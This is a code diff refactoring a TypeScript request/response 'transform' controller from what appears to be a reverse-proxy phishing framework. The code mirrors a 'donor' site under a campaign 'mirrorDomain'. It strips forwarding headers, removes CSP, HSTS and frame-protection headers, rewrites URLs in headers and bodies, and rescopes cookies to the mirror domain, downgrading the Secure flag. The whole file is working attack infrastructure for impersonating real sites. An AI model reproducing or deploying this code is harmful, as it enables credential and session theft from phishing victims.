@@ -1,23 +1,12 @@
 import { DIContainer } from '@famir/common'
-import {
-  Logger,
-  LOGGER,
-  TEMPLATER,
-  Templater,
-  Validator,
-  VALIDATOR,
-  type EnabledFullTargetModel,
-  type FullCampaignModel,
-  type TargetModel,
-} from '@famir/domain'
+import { Logger, LOGGER, TEMPLATER, Templater, Validator, VALIDATOR } from '@famir/domain'
 import {
   HTTP_SERVER_ASSETS,
   HTTP_SERVER_ROUTER,
   type HttpServerAssets,
   type HttpServerRouter,
 } from '@famir/http-server'
-import { HttpMessageInterceptor } from '@famir/http-tools'
-import { BaseController, ControllerFlags } from '../base/index.js'
+import { BaseController } from '../base/index.js'
 
 /**
  * DI token for the transform controller.
@@ -25,13 +14,6 @@ import { BaseController, ControllerFlags } from '../base/index.js'
  * @category Transform
  */
 export const TRANSFORM_CONTROLLER = Symbol('TransformController')
-
-type TransformInterceptor = (
-  flags: ControllerFlags,
-  campaign: FullCampaignModel,
-  target: EnabledFullTargetModel,
-  targets: TargetModel[]
-) => HttpMessageInterceptor
 
 /**
  * Represents the transform controller.
@@ -73,173 +55,125 @@ export class TransformController extends BaseController {
    */
   use() {
     this.router.addMiddleware('transform', async (ctx, next) => {
-      const flags = this.getState(ctx, 'flags')
+      //const flags = this.getState(ctx, 'flags')
       const campaign = this.getState(ctx, 'campaign')
       const target = this.getState(ctx, 'target')
       const targets = this.getState(ctx, 'targets')
       const message = this.getState(ctx, 'message')
 
       message
-        .addRequestHeadInterceptor(
-          'transform',
-          this.requestHeadInterceptor(flags, campaign, target, targets)
-        )
-        .addRequestBodyInterceptor(
-          'transform',
-          this.requestBodyInterceptor(flags, campaign, target, targets)
-        )
-        .addResponseHeadInterceptor(
-          'transform',
-          this.responseHeadInterceptor(flags, campaign, target, targets)
-        )
-        .addResponseBodyInterceptor(
-          'transform',
-          this.responseBodyInterceptor(flags, campaign, target, targets)
-        )
+        .addRequestHeadInterceptor('transform', () => {
+          message.url.merge({
+            protocol: target.donorProtocol,
+            hostname: target.donorHostname,
+            port: target.donorPort.toString(),
+          })
+
+          message.requestHeaders.set('Host', target.donorHost)
+
+          const oldOrigin = message.requestHeaders.getString('Origin')
+          if (oldOrigin) {
+            const newOrigin = message.rewriteUrl(oldOrigin, true, targets)
+            message.requestHeaders.set('Origin', newOrigin)
+          }
+
+          const oldReferer = message.requestHeaders.getString('Referer')
+          if (oldReferer) {
+            const newReferer = message.rewriteUrl(oldReferer, true, targets)
+            message.requestHeaders.set('Referer', newReferer)
+          }
+
+          message.requestHeaders.delete([
+            'Via',
+            'X-Real-Ip',
+            'X-Client-Ip',
+            'X-Forwarded-For',
+            'X-Forwarded-Host',
+            'X-Forwarded-Proto',
+          ])
+
+          const cookies = message.requestHeaders.getCookies()
+          if (cookies) {
+            campaign.sessionCookieNames.forEach((sessionCookieName) => {
+              if (cookies[sessionCookieName]) {
+                cookies[sessionCookieName] = undefined
+              }
+            })
+
+            message.requestHeaders.setCookies(cookies)
+          }
+        })
+        .addRequestBodyInterceptor('transform', () => {
+          const contentType = message.requestHeaders.getContentType()
+
+          if (message.isRewriteUrlContentType(contentType)) {
+            const charset = contentType?.parameters['charset']
+
+            const oldText = message.requestBody.getText(charset)
+            if (oldText) {
+              const newText = message.rewriteUrl(oldText, true, targets)
+              message.requestBody.setText(newText)
+            }
+          }
+        })
+        .addResponseHeadInterceptor('transform', () => {
+          const oldLocation = message.responseHeaders.getString('Location')
+          if (oldLocation && message.isAbsoluteUrl(oldLocation)) {
+            const newLocation = message.rewriteUrl(oldLocation, false, targets)
+            message.responseHeaders.set('Location', newLocation)
+          }
+
+          const oldAcao = message.responseHeaders.getString('Access-Control-Allow-Origin')
+          if (oldAcao) {
+            const newAcao = message.rewriteUrl(oldAcao, false, targets)
+            message.responseHeaders.set('Access-Control-Allow-Origin', newAcao)
+          }
+
+          message.responseHeaders.delete([
+            'Proxy-Agent',
+            'Content-Security-Policy',
+            'Content-Security-Policy-Report-Only',
+            'Permissions-Policy',
+            'Strict-Transport-Security',
+            'X-XSS-Protection',
+            'X-Content-Type-Options',
+            'X-Frame-Options',
+          ])
+
+          const setCookies = message.responseHeaders.getSetCookies()
+          if (setCookies) {
+            Object.keys(setCookies).forEach((name) => {
+              const setCookie = setCookies[name]
+
+              if (setCookie) {
+                if (setCookie.domain) {
+                  setCookie.domain = '.' + campaign.mirrorDomain
+                }
+
+                if (setCookie.secure && !target.mirrorSecure) {
+                  setCookie.secure = false
+                }
+              }
+            })
+
+            message.responseHeaders.setSetCookies(setCookies)
+          }
+        })
+        .addResponseBodyInterceptor('transform', () => {
+          const contentType = message.responseHeaders.getContentType()
+
+          if (message.isRewriteUrlContentType(contentType)) {
+            const charset = contentType?.parameters['charset']
+
+            const oldText = message.responseBody.getText(charset)
+            if (oldText) {
+              const newText = message.rewriteUrl(oldText, false, targets)
+              message.responseBody.setText(newText)
+            }
+          }
+        })
 
       await next()
     })
-  }
-
-  private requestHeadInterceptor: TransformInterceptor = (
-    flags,
-    campaign,
-    target,
-    targets
-  ): HttpMessageInterceptor => {
-    return (message) => {
-      message.url.merge({
-        protocol: target.donorProtocol,
-        hostname: target.donorHostname,
-        port: target.donorPort.toString(),
-      })
-
-      message.requestHeaders.set('Host', target.donorHost)
-
-      const oldOrigin = message.requestHeaders.getString('Origin')
-      if (oldOrigin) {
-        const newOrigin = message.rewriteUrl(oldOrigin, true, targets)
-        message.requestHeaders.set('Origin', newOrigin)
-      }
-
-      const oldReferer = message.requestHeaders.getString('Referer')
-      if (oldReferer) {
-        const newReferer = message.rewriteUrl(oldReferer, true, targets)
-        message.requestHeaders.set('Referer', newReferer)
-      }
-
-      message.requestHeaders.delete([
-        'Via',
-        'X-Real-Ip',
-        'X-Client-Ip',
-        'X-Forwarded-For',
-        'X-Forwarded-Host',
-        'X-Forwarded-Proto',
-      ])
-
-      const cookies = message.requestHeaders.getCookies()
-      if (cookies) {
-        campaign.sessionCookieNames.forEach((sessionCookieName) => {
-          if (cookies[sessionCookieName]) {
-            cookies[sessionCookieName] = undefined
-          }
-        })
-
-        message.requestHeaders.setCookies(cookies)
-      }
-    }
-  }
-
-  private requestBodyInterceptor: TransformInterceptor = (
-    flags,
-    campaign,
-    target,
-    targets
-  ): HttpMessageInterceptor => {
-    return (message) => {
-      const contentType = message.requestHeaders.getContentType()
-
-      if (message.isRewriteUrlContentType(contentType)) {
-        const charset = contentType?.parameters['charset']
-
-        const oldText = message.requestBody.getText(charset)
-        if (oldText) {
-          const newText = message.rewriteUrl(oldText, true, targets)
-          message.requestBody.setText(newText)
-        }
-      }
-    }
-  }
-
-  private responseHeadInterceptor: TransformInterceptor = (
-    flags,
-    campaign,
-    target,
-    targets
-  ): HttpMessageInterceptor => {
-    return (message) => {
-      const oldLocation = message.responseHeaders.getString('Location')
-      if (oldLocation && message.isAbsoluteUrl(oldLocation)) {
-        const newLocation = message.rewriteUrl(oldLocation, false, targets)
-        message.responseHeaders.set('Location', newLocation)
-      }
-
-      const oldAcao = message.responseHeaders.getString('Access-Control-Allow-Origin')
-      if (oldAcao) {
-        const newAcao = message.rewriteUrl(oldAcao, false, targets)
-        message.responseHeaders.set('Access-Control-Allow-Origin', newAcao)
-      }
-
-      message.responseHeaders.delete([
-        'Proxy-Agent',
-        'Content-Security-Policy',
-        'Content-Security-Policy-Report-Only',
-        'Permissions-Policy',
-        'Strict-Transport-Security',
-        'X-XSS-Protection',
-        'X-Content-Type-Options',
-        'X-Frame-Options',
-      ])
-
-      const setCookies = message.responseHeaders.getSetCookies()
-      if (setCookies) {
-        Object.keys(setCookies).forEach((name) => {
-          const setCookie = setCookies[name]
-
-          if (setCookie) {
-            if (setCookie.domain) {
-              setCookie.domain = '.' + campaign.mirrorDomain
-            }
-
-            if (setCookie.secure && !target.mirrorSecure) {
-              setCookie.secure = false
-            }
-          }
-        })
-
-        message.responseHeaders.setSetCookies(setCookies)
-      }
-    }
-  }
-
-  private responseBodyInterceptor: TransformInterceptor = (
-    flags,
-    campaign,
-    target,
-    targets
-  ): HttpMessageInterceptor => {
-    return (message) => {
-      const contentType = message.responseHeaders.getContentType()
-
-      if (message.isRewriteUrlContentType(contentType)) {
-        const charset = contentType?.parameters['charset']
-
-        const oldText = message.responseBody.getText(charset)
-        if (oldText) {
-          const newText = message.rewriteUrl(oldText, false, targets)
-          message.responseBody.setText(newText)
-        }
-      }
-    }
   }
 }
